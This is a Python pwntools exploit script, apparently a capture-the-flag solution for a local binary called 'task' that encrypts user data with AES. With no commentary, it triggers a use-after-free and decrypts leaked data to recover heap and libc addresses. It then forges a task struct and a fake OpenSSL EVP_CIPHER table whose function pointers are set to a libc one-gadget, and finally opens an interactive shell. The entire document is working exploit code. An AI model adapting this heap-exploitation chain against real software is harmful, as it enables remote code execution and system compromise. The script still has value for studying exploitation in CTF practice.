from pwn import *
from Crypto.Cipher import AES

p = process("./task")

KEY = "A"*32
IV = "B"*16
oneshot = 0x4f322

def aes_dec(data,key,iv):
    return AES.new(key, AES.MODE_CBC, iv).decrypt(data)

def add_task(id,flag,key,IV,size,data,chk):
	if(chk):	p.sendlineafter(":","1")
	else:	p.sendline("1")
	p.sendlineafter(":",str(id))
	p.sendlineafter(":",str(flag))
	p.sendafter(":",key)
	p.sendafter(":",IV)
	p.sendlineafter(":",str(size))
	p.sendafter(":",data)

def delete(idx):
	p.sendlineafter(":","2")
	p.sendlineafter(":",str(idx))

def go(idx):
	p.sendlineafter(":","3")
	p.sendlineafter(":",str(idx))

def add_task_ready(id,flag,key,IV,size):
	p.sendlineafter(":","1")
	p.sendlineafter(":",str(id))
	p.sendlineafter(":",str(flag))
	p.sendafter(":",key)
	p.sendafter(":",IV)
	p.sendlineafter(":",str(size))

add_task(0,1,KEY,IV,16,"C"*16,True) #0
add_task(1,1,KEY,IV,16,"D"*16,True) #1

go(0)
delete(1)
delete(0)

add_task_ready(1,1,KEY,IV,16) #1

p.recvuntil("text:")
p.recvline()
enc = p.recvline()[:-1]
enc += p.recvline()[:-1]
enc = ''.join([chr(int(k,16)) for k in enc.split(" ")])
heap_base = u64(aes_dec(enc,KEY,IV)[:6]+"\x00\x00") - 0x1720

p.send("C"*16)

print hex(heap_base)

add_task(2,1,KEY,IV,8,"a"*8,True) 
add_task(3,1,KEY,IV,8,"b"*8,True)

go(3)
delete(3)
delete(2)

'''
struct user
{
  char *data;
  __int64 data_size;
  __int32 enc_dec_flag;
  char key[32];
  char iv[36];
  EVP_CIPHER_CTX *EVP_CIPHER;
  __int32 idx;
  struct user *next;
};
'''
fake_struct  = p64(heap_base+0x1300)
fake_struct += p64(8)
fake_struct += p32(1)
fake_struct += KEY+IV
fake_struct += "\x00"*0x14
fake_struct += p64(heap_base+0x1560)
fake_struct += p64(5) #idx
fake_struct += p64(0)

add_task(4,1,KEY,IV,0x70,fake_struct,True)

p.recvuntil("text:")
p.recvline()
enc = ''.join([chr(int(k,16)) for k in p.recvline()[:-1].split(" ")])
libc_base = u64(aes_dec(enc,KEY,IV)[:6]+"\x00\x00") - 0x816620

print hex(libc_base)

'''
struct EVP_CIPHER
{
  int nid;
  int block_size;
  int key_len;
  int iv_len;
  unsigned __int64 flags;
  void *init;// func
  void *do_chiper;// func
  void *clean_up; // func
  int ctx_size;
  void *set_asn1_parameters;
  void *get_asn1_parameters;
  void *ctrl;
  void *app_data;
};

'''


print "t : " + hex(heap_base+0x1f30)

payload  = p64(heap_base+0x1d10)
payload += p64(0)+p64(1)+"B"*16+p64(0xd72a7a8b1f27fb02)+p64(0xca3d1c097c82e763)+p64(0x1010101010101010)*2+p64(0)*4+p64(0x20)+p64(0)+p64(heap_base+0x13b0)+p64(0x0000000f00000000)+p64(0)*5
payload += p64(0x00000010000001ab)
payload += p64(0x0000001000000020)
payload += p64(0x0000000000001002)
payload += p64(libc_base+oneshot)*2
payload += p64(0)+p64(0x108)+p64(0)*5

add_task(6,1,KEY,IV,len(payload),payload,False)
add_task(7,1,KEY,IV,8,"a"*8,False)
add_task(8,1,KEY,IV,8,"b"*8,True) #target

go(8)
delete(8)
delete(7)

fake_struct  = p64(heap_base+0x14c0)
fake_struct += p64(8)
fake_struct += p32(1)
fake_struct += KEY+IV
fake_struct += "\x00"*0x14
fake_struct += p64(heap_base+0x1c60)
fake_struct += p64(10) #idx
fake_struct += p64(0)

add_task(9,1,KEY,IV,0x70,fake_struct,True)


p.interactive()
